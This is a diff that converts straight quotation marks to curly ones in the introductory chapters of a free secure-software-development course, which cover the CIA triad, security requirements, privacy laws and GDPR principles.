@@ -20,9 +20,9 @@ We can quickly fix significant mistakes, but we otherwise want to only implement
 
 The learning approach is designed to potentially support many users (with a potential of 10-15 million), so all problems (including knowledge checks) must be completely automated. There are no plans to use cohorts, discussions, or anything else requiring human instructors (because that doesn’t scale well). In most cases the knowledge checks are 1-2 multiple choice questions. They will generally have a random *order* of answers, but not Randomized *values* of answer (no Python script is involved).
 
-The "about" page, marketing material, etc., is not covered in this document.
+The “about” page, marketing material, etc., is not covered in this document.
 
-Note that edX requires groupings at 3 levels: Sections, Subsections, and Units. Only Units (level 3) can have content.  We represent this in the material below as follows:  A "Heading 1" represents the beginning of a Section and contains ONLY sequences beginning with “Heading 2” (no text). A “Heading 2” represents the beginning of a Subsection and contains ONLY sequences beginning with “Heading 3”. A “Heading 3” represents the beginning of a Unit and contains all content. A Heading 3 cannot be directly contained within a Heading 1. Heading 4 (and below) are used freely within a Unit.
+Note that edX requires groupings at 3 levels: Sections, Subsections, and Units. Only Units (level 3) can have content.  We represent this in the material below as follows:  A “Heading 1” represents the beginning of a Section and contains ONLY sequences beginning with “Heading 2” (no text). A “Heading 2” represents the beginning of a Subsection and contains ONLY sequences beginning with “Heading 3”. A “Heading 3” represents the beginning of a Unit and contains all content. A Heading 3 cannot be directly contained within a Heading 1. Heading 4 (and below) are used freely within a Unit.
 
 For more information about this material, see the folder here:
 
@@ -56,11 +56,11 @@ Our thanks to the many people who provided helpful commentary and advice. We esp
 
 Every day there is news about computer systems being broken into, often via various vulnerabilities in the software. Insecure software may:
 
-* Release private/secret information (aka *"lose confidentiality"*)
+* Release private/secret information (aka *“lose confidentiality”*)
 
-* Lose or corrupt information (aka "*lose integrity*")
+* Lose or corrupt information (aka “*lose integrity*”)
 
-* Lose service (aka *"lose availability"*).
+* Lose service (aka *“lose availability”*).
 
 But the problems don’t end there. Any of these can cause *real world* losses. They can cost money, time, trust, and even lives.
 
@@ -82,7 +82,7 @@ Our primary concern is that you learn how to develop *secure* software. Here are
 
 2. **Free**. If you just want to learn, it doesn’t cost anything! All you need is an internet connection. Many people have limited resources and we want to make sure this information is available to them.
 
-3. **Open Content**. The main informational material is not just "free" in the sense of “no cost” but also in terms of freedom. In particular, the informational content is released under the [Creative Commons Attribution License (CC-BY) version 4.0](https://creativecommons.org/licenses/by/4.0/), so you can reuse it in many ways. We *want* you to use this information! There are some exceptions: we quote other material (such as from xkcd) which are under their own licenses, and to counter cheating we do not release the graded tests used in the edX version of this course this way.
+3. **Open Content**. The main informational material is not just “free” in the sense of “no cost” but also in terms of freedom. In particular, the informational content is released under the [Creative Commons Attribution License (CC-BY) version 4.0](https://creativecommons.org/licenses/by/4.0/), so you can reuse it in many ways. We *want* you to use this information! There are some exceptions: we quote other material (such as from xkcd) which are under their own licenses, and to counter cheating we do not release the graded tests used in the edX version of this course this way.
 
 4. **Certificate of Completion (for learners enrolled in a Verified track in the edX version)**. If you want to prove that you took the course (as opposed to simply learning it), that is available at a nominal price. This might really help you communicate what you know to employers, customers, or potential employers. By comparison, just owning a book doesn’t prove that you have read or understood it.
 
@@ -100,9 +100,9 @@ There are other materials that can provide information about software security. 
 
 1. The [*Security Engineering*](https://www.cl.cam.ac.uk/~rja14/book.html) book by Ross Anderson focuses on systems as a whole, including hardware and business processes, and focuses on big-picture concerns. However, this book does not cover most of the specifics of how to implement secure software. In contrast, this course (unlike Ross Anderson’s book) takes care to identify and discuss how to counter the most common kinds of security vulnerabilities.
 
-2. [SAFECode training materials](https://safecode.org/training/). SAFECode has a number of training materials available. Some materials are quite good and are videos (while this course is mostly text). Note that many of their materials are often narrowly focused. For example, their course *"Cross Site Scripting (XSS) 101"* is on a single common kind of vulnerability, and *“Secure Java Programming 101”* only applies to one language. Check the dates, as some materials may be out of date. That said, if their materials match what you want, you should definitely check them out, as they are definitely worthy alternatives.
+2. [SAFECode training materials](https://safecode.org/training/). SAFECode has a number of training materials available. Some materials are quite good and are videos (while this course is mostly text). Note that many of their materials are often narrowly focused. For example, their course *“Cross Site Scripting (XSS) 101”* is on a single common kind of vulnerability, and *“Secure Java Programming 101”* only applies to one language. Check the dates, as some materials may be out of date. That said, if their materials match what you want, you should definitely check them out, as they are definitely worthy alternatives.
 
-3. [OWASP Security Knowledge Framework (OWASP-SKF)](https://www.securityknowledgeframework.org/). "OWASP-SKF is an open source web application that explains secure coding principles in multiple programming languages. The goal of OWASP-SKF is to help you learn and integrate security by design in your software development and build applications that are secure by design. OWASP-SKF does this through manageable software development projects with checklists (using [OWASP-ASVS](https://owasp.org/www-project-application-security-verification-standard/)/[OWASP-MASVS](https://owasp.org/www-project-mobile-security-testing-guide/)  or custom security checklists) and labs to practice security verification (using SKF-Labs, [OWASP Juice-shop](https://owasp.org/www-project-juice-shop/), and best practice code examples from SKF and the [OWASP-Cheatsheets](https://cheatsheetseries.owasp.org))." In contrast, this course (unlike OWASP-SKF) doesn’t require software development projects and labs.
+3. [OWASP Security Knowledge Framework (OWASP-SKF)](https://www.securityknowledgeframework.org/). “OWASP-SKF is an open source web application that explains secure coding principles in multiple programming languages. The goal of OWASP-SKF is to help you learn and integrate security by design in your software development and build applications that are secure by design. OWASP-SKF does this through manageable software development projects with checklists (using [OWASP-ASVS](https://owasp.org/www-project-application-security-verification-standard/)/[OWASP-MASVS](https://owasp.org/www-project-mobile-security-testing-guide/)  or custom security checklists) and labs to practice security verification (using SKF-Labs, [OWASP Juice-shop](https://owasp.org/www-project-juice-shop/), and best practice code examples from SKF and the [OWASP-Cheatsheets](https://cheatsheetseries.owasp.org)).” In contrast, this course (unlike OWASP-SKF) doesn’t require software development projects and labs.
 
 Obviously, choose the material that will provide you with the information you want to learn, and you can certainly use them all if you wish.
 
@@ -128,15 +128,15 @@ Learning Objectives:
 
 ## What Do We Need?
 
-### What Does "Security" Mean?
+### What Does “Security” Mean?
 
 To get secure software, we first need to understand what *security* means. Different software has different specific security requirements, but many people divide security requirements into three broad objectives - Confidentiality, Integrity, and Availability:
 
-* **Confidentiality**<br>"No unauthorized read" - users are only allowed to read the information they are authorized to read.
+* **Confidentiality**<br>“No unauthorized read” - users are only allowed to read the information they are authorized to read.
 
-* **Integrity**<br>"No unauthorized modification (write or delete)"  - users are only allowed to modify the information they are authorized to modify; modification includes additions, changes, and deletions.
+* **Integrity**<br>“No unauthorized modification (write or delete)”  - users are only allowed to modify the information they are authorized to modify; modification includes additions, changes, and deletions.
 
-* **Availability**<br>"Keeps working in presence of attack." - the software keeps working while under attack. A Denial of Service (DoS) attack is an attack that tries to make the software no longer available.
+* **Availability**<br>“Keeps working in presence of attack.” - the software keeps working while under attack. A Denial of Service (DoS) attack is an attack that tries to make the software no longer available.
 
 This set of Confidentiality, Integrity, and Availability (CIA) is sometimes called the CIA triad.
 
@@ -186,15 +186,15 @@ Of course, the actual requirements depend on what you’re trying to accomplish.
 
 So how can you determine the security requirements for a particular system? One way to identify security requirements is to think about the common security objectives and supporting security functions we have *already* discussed and determine the specific requirements for your system in each category. In particular, think about how each one applies to the kind of information your program will manage. Let’s walk through each security objective and supporting security function, and discuss some things to consider:
 
-1. **Confidentiality** ("No unauthorized read")<br>Identify information that should not be publicly revealed, such as private information about people and systems. Who should be allowed to see that? Can you avoid having that information at all (since you cannot reveal what you do not have)? If you store password information so people can log in to your system (aka “inbound” authentication), you need to store this password information using special algorithms designed for it (such as Argon2id), as we will discuss later.
+1. **Confidentiality** (“No unauthorized read”)<br>Identify information that should not be publicly revealed, such as private information about people and systems. Who should be allowed to see that? Can you avoid having that information at all (since you cannot reveal what you do not have)? If you store password information so people can log in to your system (aka “inbound” authentication), you need to store this password information using special algorithms designed for it (such as Argon2id), as we will discuss later.
 
-2. **Integrity** ("No unauthorized modification")<br>Identify information that only some people should be allowed to modify, and who that is.
+2. **Integrity** (“No unauthorized modification”)<br>Identify information that only some people should be allowed to modify, and who that is.
 
-3. **Availability** ("Keeps working in presence of attack")<br>What is the impact if it does not work for a while - is that serious? Availability is rarely an absolute. If your system is accessible via the internet, availability is very challenging to provide; a well-resourced attacker can always use a Distributed Denial of Service (DDoS) attack to take down a site, at least for a little while. It is possible to work to counter DDoS attacks, but in the end it can turn into a competition between how many resources each side has.
+3. **Availability** (“Keeps working in presence of attack”)<br>What is the impact if it does not work for a while - is that serious? Availability is rarely an absolute. If your system is accessible via the internet, availability is very challenging to provide; a well-resourced attacker can always use a Distributed Denial of Service (DDoS) attack to take down a site, at least for a little while. It is possible to work to counter DDoS attacks, but in the end it can turn into a competition between how many resources each side has.
     
-    Even when availability cannot be universally guaranteed, you can still have secure software by focusing on the bigger-risk items ([Not all attackers are equal: understanding and preventing DoS in web applications](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020).  In many cases, focus on developing your software so it is not *easy* to overwhelm or take down with simple inputs; make it possible to temporarily scale up the software by rapidly adding new servers; and implement the software so it quickly recovers when an attack ends. To counter the risk that the system might be destroyed or have its data deleted, design the software so its data is easily backed up, and plan for backups. Ensure that data can be backed up to "cold storage" (where the data cannot be corrupted later if the software is subverted). If the system is routinely backed up in operations, you can recover relatively quickly (at least partially). So yes, you *can* have availability as a requirement, as long as its limitations are clear.
+    Even when availability cannot be universally guaranteed, you can still have secure software by focusing on the bigger-risk items ([Not all attackers are equal: understanding and preventing DoS in web applications](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/), by Jacob Kaplan-Moss, 2020).  In many cases, focus on developing your software so it is not *easy* to overwhelm or take down with simple inputs; make it possible to temporarily scale up the software by rapidly adding new servers; and implement the software so it quickly recovers when an attack ends. To counter the risk that the system might be destroyed or have its data deleted, design the software so its data is easily backed up, and plan for backups. Ensure that data can be backed up to “cold storage” (where the data cannot be corrupted later if the software is subverted). If the system is routinely backed up in operations, you can recover relatively quickly (at least partially). So yes, you *can* have availability as a requirement, as long as its limitations are clear.
 
-4. **Non-repudiation** ("Prove someone did something")<br>Is there some action that you want to be able to *prove* someone took? In many systems this is not critical, but in some it is.
+4. **Non-repudiation** (“Prove someone did something”)<br>Is there some action that you want to be able to *prove* someone took? In many systems this is not critical, but in some it is.
 
 5. **Identity & authentication (I&A)**<br>How will users prove who they are? You want to make sure that someone cannot spoof a legitimate user. You should normally support two-factor authentication (2FA), either directly or by allowing users to prove their identity via some other service that supports it.
 
@@ -202,15 +202,15 @@ So how can you determine the security requirements for a particular system? One 
 
 7. **Auditing/Logging**<br>What information/events should you record? Typically you at least record login, logout, and important events like user account creation and deletion. Generally a system should record when something happened (date and time), what happened, what system component did it, and who caused it to happen.
 
-You will sometimes see documents that use the security terms "subject" and “object”. A “subject” is something that acts (e.g., a user or process). An “object” is something being acted on (e.g., a file or network port).
+You will sometimes see documents that use the security terms “subject” and “object”. A “subject” is something that acts (e.g., a user or process). An “object” is something being acted on (e.g., a file or network port).
 
-Some developers capture some requirements as *use cases*. Each use case is a list of interactions between actor(s) and a system to achieve a goal. This has led to an interesting security approach, the development of *abuse cases* or *misuse cases*. An abuse case is a list of interactions between actors and a system that are intended to cause harm (e.g., to the system, actor(s), or stakeholders). A very similar term is "misuse case", a description of a malicious act against a system. Many have found it useful to define abuse cases or misuse cases to then describe how the system must *counter* such abuse/misuse. By thinking about abuse and misuse, and figuring out how to counter them early, a lot of mischief can be prevented. Many developers find it hard to *think like an attacker*, so throughout this course we will focus on techniques to help you find vulnerabilities anyway, for example, by identifying common types of vulnerabilities and explaining how to systematically do threat modeling.
+Some developers capture some requirements as *use cases*. Each use case is a list of interactions between actor(s) and a system to achieve a goal. This has led to an interesting security approach, the development of *abuse cases* or *misuse cases*. An abuse case is a list of interactions between actors and a system that are intended to cause harm (e.g., to the system, actor(s), or stakeholders). A very similar term is “misuse case”, a description of a malicious act against a system. Many have found it useful to define abuse cases or misuse cases to then describe how the system must *counter* such abuse/misuse. By thinking about abuse and misuse, and figuring out how to counter them early, a lot of mischief can be prevented. Many developers find it hard to *think like an attacker*, so throughout this course we will focus on techniques to help you find vulnerabilities anyway, for example, by identifying common types of vulnerabilities and explaining how to systematically do threat modeling.
 
 An important aspect about security requirements is what kind of attackers you expect to counter. Countering targeted attacks by well-resourced nation-states is extremely difficult; you need to know and apply more than this course can cover by itself. However, most people are not trying to develop systems that withstand these kinds of attacks. In this course, we will assume that your software must stand up to attacks that a typical commercial site might need to counter, where the attacker has limited resources and the attacks are often not highly targeted. If you need to defend against attackers with more resources, you will probably need to do much more, but the material in this course will give you a good starting point.
 
-Note that in this course we focus on attackers, not hackers. In the computer community the term "hacker" is widely used to identify *"a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular."* ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983)). By this definition, many hackers never attack computer systems, and many attackers are not hackers. This course focuses on foiling attackers.
+Note that in this course we focus on attackers, not hackers. In the computer community the term “hacker” is widely used to identify *“a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular.”* ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983)). By this definition, many hackers never attack computer systems, and many attackers are not hackers. This course focuses on foiling attackers.
 
-If you are looking for ideas for potential security requirements, one source is the [*Common Criteria for Information Technology Security Evaluation" (CC) part 2*](https://www.commoncriteriaportal.org/), which is freely available. The CC is an international standard for evaluating security that was originally developed in 1994. The vast majority of software developed today does not undergo a CC evaluation, in part because it is often both expensive and time-consuming to have an external lab formally evaluate your software using the CC. However, you can still look at the CC for ideas even if you will not use an evaluation lab. The CC is publicly available and has 3 parts: part 1 is an introduction, part 2 is a list of common security functional requirements, and part 3 is a list of common assurance requirements. Part 2 in particular is a list of *"security functions you might require”*. If you suspect your system will need some special security requirements, but are not sure what those might be, part 2 provides a long list of ideas that might be useful. Some of its terminology is arcane, but it includes a glossary which can help.
+If you are looking for ideas for potential security requirements, one source is the [*Common Criteria for Information Technology Security Evaluation” (CC) part 2*](https://www.commoncriteriaportal.org/), which is freely available. The CC is an international standard for evaluating security that was originally developed in 1994. The vast majority of software developed today does not undergo a CC evaluation, in part because it is often both expensive and time-consuming to have an external lab formally evaluate your software using the CC. However, you can still look at the CC for ideas even if you will not use an evaluation lab. The CC is publicly available and has 3 parts: part 1 is an introduction, part 2 is a list of common security functional requirements, and part 3 is a list of common assurance requirements. Part 2 in particular is a list of *“security functions you might require”*. If you suspect your system will need some special security requirements, but are not sure what those might be, part 2 provides a long list of ideas that might be useful. Some of its terminology is arcane, but it includes a glossary which can help.
 
 **Finally:** If there is existing software that does something like the software you are developing, look at its security capabilities. They added those capabilities for a reason, and your software might need at least some of them as well.
 
@@ -236,27 +236,27 @@ Security and privacy are interrelated, but not the same thing. In this unit we w
 
 #### What Does Privacy Mean?
 
-The non-profit [International Association of Privacy Professionals (IAPP) defines privacy](https://iapp.org/about/what-is-privacy/) as *"the right to be let alone, or freedom from interference or intrusion"*. More specifically, it says *“Information privacy is the right to have some control over how your personal information is collected and used... various cultures have widely differing views on what a person’s rights are when it comes to privacy and how it should be regulated.”* They also contrast privacy and security: *“Data privacy is focused on the use and governance of personal data—things like putting policies in place to ensure that consumers’ personal information is being collected, shared and used in appropriate ways.”*
+The non-profit [International Association of Privacy Professionals (IAPP) defines privacy](https://iapp.org/about/what-is-privacy/) as *“the right to be let alone, or freedom from interference or intrusion”*. More specifically, it says *“Information privacy is the right to have some control over how your personal information is collected and used... various cultures have widely differing views on what a person’s rights are when it comes to privacy and how it should be regulated.”* They also contrast privacy and security: *“Data privacy is focused on the use and governance of personal data—things like putting policies in place to ensure that consumers’ personal information is being collected, shared and used in appropriate ways.”*
 
 Put another way, privacy is about protecting personal data about individuals from abuse.
 
 #### Why Is Privacy Important?
 
-While some have argued that privacy is no longer possible or relevant, many others disagree, and many laws have been put in place around the world to protect privacy. One accessible summary for the widespread position that privacy is important is Glenn Greenwald’s TED Talk [*"Why privacy matters"*](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) (2014). Here are some of his points (see the talk for details):
+While some have argued that privacy is no longer possible or relevant, many others disagree, and many laws have been put in place around the world to protect privacy. One accessible summary for the widespread position that privacy is important is Glenn Greenwald’s TED Talk [*“Why privacy matters”*](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) (2014). Here are some of his points (see the talk for details):
 
-* People who say, *"If you're doing something that you don't want other people to know, maybe you shouldn't be doing it in the first place"* are engaged in extreme self-deprecation; *“What they're really saying is,"I have agreed to make myself such a harmless and unthreatening and uninteresting person that I actually don't fear having the government know what it is that I'm doing.’”*
+* People who say, *“If you're doing something that you don’t want other people to know, maybe you shouldn't be doing it in the first place”* are engaged in extreme self-deprecation; *“What they're really saying is,"I have agreed to make myself such a harmless and unthreatening and uninteresting person that I actually don't fear having the government know what it is that I'm doing.’”*
 
 * Many of these same people [who make these claims] do not actually act in this way, e.g., they will take many steps to gain privacy for themselves.
 
-* *"There’s a reason privacy is so craved universally and instinctively… when we're in a state where we can be monitored, where we can be watched, our behavior changes dramatically… There are dozens of psychological studies that prove that when somebody knows that they might be watched, the behavior they engage in is vastly more conformist and compliant."*
+* *“There’s a reason privacy is so craved universally and instinctively… when we're in a state where we can be monitored, where we can be watched, our behavior changes dramatically… There are dozens of psychological studies that prove that when somebody knows that they might be watched, the behavior they engage in is vastly more conformist and compliant.”*
 
-* *"Mass surveillance creates a prison in the mind that is a much more subtle though much more effective means of fostering compliance with social norms or with social orthodoxy, much more effective than brute force could ever be."*
+* *“Mass surveillance creates a prison in the mind that is a much more subtle though much more effective means of fostering compliance with social norms or with social orthodoxy, much more effective than brute force could ever be.”*
 
-* *"A society in which people can be monitored at all times is a society that breeds conformity and obedience and submission, which is why every tyrant, the most overt to the most subtle, craves that system."*
+* *“A society in which people can be monitored at all times is a society that breeds conformity and obedience and submission, which is why every tyrant, the most overt to the most subtle, craves that system.”*
 
-* *"When we allow a society to exist in which we're subject to constant monitoring, we allow the essence of human freedom to be severely crippled."*
+* *“When we allow a society to exist in which we're subject to constant monitoring, we allow the essence of human freedom to be severely crippled.”*
 
-* *"a system of mass surveillance suppresses our own freedom in all sorts of ways. It renders off-limits all kinds of behavioral choices without our even knowing that it's happened."*
+* *“a system of mass surveillance suppresses our own freedom in all sorts of ways. It renders off-limits all kinds of behavioral choices without our even knowing that it’s happened.”*
 
 ### Privacy Requirements
 
@@ -272,13 +272,13 @@ Failing that, minimize personal information to what you absolutely require. If y
 
 Laws and regulations about privacy are widespread. Different terms are used for them, including information privacy, data privacy, and data protection. Whether or not these laws and regulations affect your software depends on what kind of data your software collects. In many cases, software does not need to do anything special for privacy. However, in other cases these laws and regulations can matter greatly.
 
-[Article 17 of the International Covenant on Civil and Political Rights of the United Nations](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx) in 1966 is widely ratified and protects privacy. It says, *"No one shall be subjected to arbitrary or unlawful interference with his privacy, family, home or correspondence, nor to unlawful attacks on his honour and reputation. Everyone has the right to the protection of the law against such interference or attacks."*
+[Article 17 of the International Covenant on Civil and Political Rights of the United Nations](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx) in 1966 is widely ratified and protects privacy. It says, *“No one shall be subjected to arbitrary or unlawful interference with his privacy, family, home or correspondence, nor to unlawful attacks on his honour and reputation. Everyone has the right to the protection of the law against such interference or attacks.”*
 
 Different countries, and provinces/states within countries, have different laws regarding privacy. Here we will briefly discuss the US and European approaches.
 
 #### United States
 
-The United States (US) does not have a comprehensive information privacy law as a whole. Instead, the US federal government has a number of laws that cover specific circumstances. This includes the Family Educational Rights and Privacy Act of 1974 (FERPA) for student education records, the Health Insurance Portability and Accountability Act of 1996 (HIPAA) for health-related data, the Children's Online Privacy Protection Act of 1998 (COPPA) for data related to children, and the Fair and Accurate Credit Transactions Act of 2003 (FACTA) for some financial data.
+The United States (US) does not have a comprehensive information privacy law as a whole. Instead, the US federal government has a number of laws that cover specific circumstances. This includes the Family Educational Rights and Privacy Act of 1974 (FERPA) for student education records, the Health Insurance Portability and Accountability Act of 1996 (HIPAA) for health-related data, the Children’s Online Privacy Protection Act of 1998 (COPPA) for data related to children, and the Fair and Accurate Credit Transactions Act of 2003 (FACTA) for some financial data.
 
 The [US Privacy Act of 1974 (5 U.S.C. 552a)](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf) mandates how US federal agencies must maintain records about individuals who are US citizens and lawful permanent resident aliens. For example, they must:
 
@@ -286,13 +286,13 @@ The [US Privacy Act of 1974 (5 U.S.C. 552a)](https://www.govinfo.gov/content/pkg
 
 * explain at the time the information is being collected, why it is needed and how it will be used;
 
-* ensure that the records are used only for the reasons given, or seek the person's permission when another purpose for the records' use is considered necessary or desirable;
+* ensure that the records are used only for the reasons given, or seek the person’s permission when another purpose for the records’ use is considered necessary or desirable;
 
 * provide adequate safeguards to protect the records from unauthorized access and disclosure; and
 
 * allow people to see the records kept on them and provide them with the opportunity to correct inaccuracies in their records.
 
-Some US states have additional laws. For example, the [California Online Privacy Protection Act (OPPA) of 2003](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575) requires operators of commercial web sites or online services *"that collects personally identifiable information through the Internet about individual consumers residing in California who use or visit its [site or service must] conspicuously post its privacy policy…"* and comply with it. More recently, the [California Consumer Privacy Act of 2018 (CCPA)](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5), which became effective in 2020, gives California residents additional rights to know what personal information has been collected by businesses, and to opt out of the sale of that information.
+Some US states have additional laws. For example, the [California Online Privacy Protection Act (OPPA) of 2003](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575) requires operators of commercial web sites or online services *“that collects personally identifiable information through the Internet about individual consumers residing in California who use or visit its [site or service must] conspicuously post its privacy policy…”* and comply with it. More recently, the [California Consumer Privacy Act of 2018 (CCPA)](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5), which became effective in 2020, gives California residents additional rights to know what personal information has been collected by businesses, and to opt out of the sale of that information.
 
 Europe *does* have a comprehensive law, and even those outside Europe often must comply with it. So let’s focus on it; it applies to many situations, and understanding it will help you understand other privacy requirements.
 
@@ -302,7 +302,7 @@ The European General Data Protection Regulation (GDPR) protects the personal dat
 
 But first: complying with the GDPR is important. Serious infringements can result in a fine of up to €20 million, or 4% of a firm’s worldwide annual revenue from the preceding financial year, whichever amount is *higher*.
 
-The GDPR defines personal data (requiring protection as such) as *"any information relating to an identified or identifiable natural person (‘data subject’); an identifiable natural person is one who can be identified, directly or indirectly, in particular by reference to an identifier such as a name, an identification number, location data, an online identifier or to one or more factors specific to the physical, physiological, genetic, mental, economic, cultural or social identity of that natural person"*. Note that it is not just data that identifies an individual - it is data that is connected to data that identifies an individual. For example, a person’s mailing address is personal data; details about a person’s skills or preferences are also personal data if they are linked, or reasonably capable of being linked, to other information identifying that individual.
+The GDPR defines personal data (requiring protection as such) as *“any information relating to an identified or identifiable natural person (‘data subject’); an identifiable natural person is one who can be identified, directly or indirectly, in particular by reference to an identifier such as a name, an identification number, location data, an online identifier or to one or more factors specific to the physical, physiological, genetic, mental, economic, cultural or social identity of that natural person”*. Note that it is not just data that identifies an individual - it is data that is connected to data that identifies an individual. For example, a person’s mailing address is personal data; details about a person’s skills or preferences are also personal data if they are linked, or reasonably capable of being linked, to other information identifying that individual.
 
 Under the GDPR some personal data are considered more sensitive, and there are greater restrictions on collecting and processing them. These include:
 
@@ -318,9 +318,9 @@ Under the GDPR some personal data are considered more sensitive, and there are g
 
 * data concerning a natural person’s sex life or sexual orientation
 
-Personal data is *processed* any time an operation is performed on it. This includes collecting, storing, viewing, transmitting, and deleting it, whether or not by automated means. In the GDPR, a "controller" is the person or organization who determines the purpose and means of processing. A “processor” is a third party that processes the data on a controller’s behalf.
+Personal data is *processed* any time an operation is performed on it. This includes collecting, storing, viewing, transmitting, and deleting it, whether or not by automated means. In the GDPR, a “controller” is the person or organization who determines the purpose and means of processing. A “processor” is a third party that processes the data on a controller’s behalf.
 
-The GDPR defines seven primary principles for processing personal data. These principles inform the purposes of all of the specific provisions of the GDPR. Understanding them goes a long way towards having a good initial "gut reaction" for whether a particular use of personal data is likely to be acceptable. These are:
+The GDPR defines seven primary principles for processing personal data. These principles inform the purposes of all of the specific provisions of the GDPR. Understanding them goes a long way towards having a good initial “gut reaction” for whether a particular use of personal data is likely to be acceptable. These are:
 
 1. **Lawfulness, Fairness and Transparency**<br>Process personal data in a way that is legal, fair and transparent to the data subject.
 
@@ -338,13 +338,13 @@ The GDPR defines seven primary principles for processing personal data. These pr
 
 Six articles in the GDPR lay out specific rights given to individuals regarding their personal data. This gives EU residents the right to contact a data controller and request that it take certain actions (*GDPR requests*). Since EU residents have these rights, software systems and organizational processes must be designed to enable these rights. The types of requests described in the GDPR include the following:
 
-* **Right of Access** (Art. 15)<br>Data subjects can ask whether their personal data is being processed. If it is, they can receive "access" to the data (e.g., a copy or screenshot of it) and information regarding the processing.
+* **Right of Access** (Art. 15)<br>Data subjects can ask whether their personal data is being processed. If it is, they can receive “access” to the data (e.g., a copy or screenshot of it) and information regarding the processing.
 
 * **Right to Rectification** (Art. 16)<br>Data subjects can have inaccurate data updated and corrected.
 
-* **Right to Erasure** (a.k.a "Right to be Forgotten") (Art. 17)<br>In certain circumstances, data subjects can have their personal data erased.
+* **Right to Erasure** (a.k.a “Right to be Forgotten”) (Art. 17)<br>In certain circumstances, data subjects can have their personal data erased.
 
-* **Right to Restriction of Processing** (Art. 18)<br>In certain circumstances, data subjects can restrict processing of their personal data. It can still be stored, unless a "Right to Erasure" request was also made.
+* **Right to Restriction of Processing** (Art. 18)<br>In certain circumstances, data subjects can restrict processing of their personal data. It can still be stored, unless a “Right to Erasure” request was also made.
 
 * **Right to Data Portability** (Art. 20)<br>In certain circumstances, data subjects can have their personal data exported (e.g., provided to the data subject or a third party in a structured, commonly used and machine-readable format).
 
@@ -356,15 +356,15 @@ To process personal data, it must be lawful, meaning it must fall into at least 
 
 * **Performing a Contract with the Data Subject**. Personal data can be processed if it is necessary to perform a contract that is with that data subject. *Note that this likely does not apply to a contract with somebody other than the data subject, such as their employer.*
 
-* **Legitimate Business Interests**. Personal data can be processed if doing so is consistent with "legitimate interests," unless overridden by the data subject’s interests to the contrary. This can be a more ambiguous concept.
+* **Legitimate Business Interests**. Personal data can be processed if doing so is consistent with “legitimate interests,” unless overridden by the data subject’s interests to the contrary. This can be a more ambiguous concept.
 
 * **Consent**. Personal data can be processed if the data subject gives their consent.
 
 Note that personal data can be processed if the data subject gives their consent. However, for consent to be valid under the GDPR:
 
-* it must be *"specific"* and *“informed”* (e.g., it should include a specific description of what data is being collected, and how it will be used);
+* it must be *“specific”* and *“informed”* (e.g., it should include a specific description of what data is being collected, and how it will be used);
 
-* it requires a *"clear affirmative action"* by the data subject (e.g., requiring the participant to check a checkbox, and not having it pre-checked); and
+* it requires a *“clear affirmative action”* by the data subject (e.g., requiring the participant to check a checkbox, and not having it pre-checked); and
 
 * it must be freely revocable (e.g., the data subject must be able to withdraw consent at any time).
 
@@ -378,23 +378,23 @@ Here are some resources for learning more about the GDPR:
 
 * The [official EU site for the GDPR text](http://data.europa.eu/eli/reg/2016/679/oj) 
 
-* [*"The Guide to the General Data Protection Regulation (GDPR)"*](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/) 
+* [*“The Guide to the General Data Protection Regulation (GDPR)”*](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/) 
 
-* [*"Solutions for a responsible use of the blockchain in the context of personal data"*](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf) 
+* [*“Solutions for a responsible use of the blockchain in the context of personal data”*](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf) 
 
-* [*"Security of Personal Data"*](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf) 
+* [*“Security of Personal Data”*](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf) 
 
-* The Linux Foundation, [*"Summary of GDPR Concepts For Free and Open Source Software Projects"*](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf)
+* The Linux Foundation, [*“Summary of GDPR Concepts For Free and Open Source Software Projects”*](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf)
 
 * [California Online Privacy Protection Act, Chapter 22. Internet Privacy Requirements [22575-22579]](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575)
 
 #### Telemetry
 
-Software sometimes includes functionality to collect telemetry data, that is, data about how the software is used or performing. Telemetry data is often collected through a "phone home" mechanism built into the software itself, where the software sends this data elsewhere.
+Software sometimes includes functionality to collect telemetry data, that is, data about how the software is used or performing. Telemetry data is often collected through a “phone home” mechanism built into the software itself, where the software sends this data elsewhere.
 
 Telemetry data is especially fraught with privacy and confidentiality issues. End users are typically presented with an option to opt-in to share statistical data with the developers of the software, but that agreement may not be adequate. End users ideally should be given a full awareness of what data may be sent to the vendor or other third party when they use the software, and abilities to control that transfer of data.
 
-The Linux Foundation’s [*"Telemetry Data Collection and Usage Policy"*](https://www.linuxfoundation.org/telemetry-data-policy/) presents a brief discussion of some of the issues that should be considered before implementing telemetry data collection, as well as discussing the Foundation’s approach to managing use of telemetry by its open source project communities. This may be useful to you in other contexts.
